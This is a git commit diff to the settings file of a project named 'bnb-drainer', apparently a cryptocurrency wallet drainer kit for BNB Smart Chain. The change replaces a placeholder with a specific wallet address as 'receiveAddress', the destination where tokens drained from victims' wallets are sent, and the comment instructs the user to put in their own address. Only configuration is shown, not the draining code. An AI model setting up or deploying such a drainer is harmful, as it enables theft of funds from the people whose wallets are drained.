0171c0e3b597e5c907fb16a3204bd343393c1a56
surpluxtemmy <97810769+surpluxtemmy@users.noreply.github.com>
2024-07-09 00:44:25 +0100

    Update settings.js

--- bnb-drainer/settings.js
+++ bnb-drainer/settings.js
@@ -1,6 +1,6 @@
 //code for local smart contract
 
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0xB59bf44De25394296E0993dBA8319C969562eB80";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
